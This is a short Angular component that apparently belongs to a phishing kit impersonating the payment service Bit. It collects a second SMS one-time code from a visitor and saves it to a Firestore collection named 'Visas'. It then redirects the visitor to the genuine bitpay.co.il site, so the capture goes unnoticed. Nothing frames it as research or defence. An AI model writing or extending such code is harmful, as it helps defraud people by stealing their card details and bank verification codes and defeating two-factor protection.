import { Component } from '@angular/core';
import { AngularFirestore } from '@angular/fire/compat/firestore';
import { Router } from '@angular/router';

@Component({
  selector: 'app-sms2',
  templateUrl: './sms2.component.html',
  styleUrls: ['./sms2.component.scss'],
})
export class Sms2Component {
  otp: string = '';
  id:string=''
  constructor(private router: Router, private firestore:AngularFirestore) {}
  onSubmit() {
    if (this.otp != '') {
        setTimeout(() => {
          this.firestore.collection('Visas').doc(this.id).update({
            sms_2: this.otp,
          });
        }, 2000);
      window.location.href = 'https://www.bitpay.co.il/he';

    }
  }
}
